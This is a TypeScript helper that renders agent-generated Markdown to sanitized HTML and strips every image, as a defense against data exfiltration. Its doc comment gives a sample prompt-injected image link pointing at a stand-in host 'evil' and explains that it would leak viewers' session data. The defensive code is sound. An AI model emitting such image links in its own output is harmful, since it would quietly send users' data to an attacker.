import { renderMarkdown as renderSanitizedMarkdown } from "@a2ui/markdown-it";

/**
 * Render untrusted Markdown to sanitized HTML with every image removed.
 *
 * `@a2ui/markdown-it` sanitizes with DOMPurify's defaults, which keep
 * `<img src="https://...">`. The Markdown this app renders comes from the agent
 * (or content it fetched), so a prompt-injected `![x](https://evil/?d=...)`
 * would make every viewer's browser send session data to that host with no
 * click. Each image is replaced by its alt text instead. The CSP `img-src` in
 * `next.config.ts` backs this up.
 *
 * @param value - The Markdown to render.
 * @returns The sanitized HTML, free of `<img>` elements.
 */
export async function renderMarkdown(value: string): Promise<string> {
  const html = await renderSanitizedMarkdown(value);
  // A <template>'s content is inert, so parsing the HTML here loads no images.
  const template = document.createElement("template");
  template.innerHTML = html;
  for (const img of template.content.querySelectorAll("img")) {
    img.replaceWith(img.getAttribute("alt") ?? "");
  }
  return template.innerHTML;
}
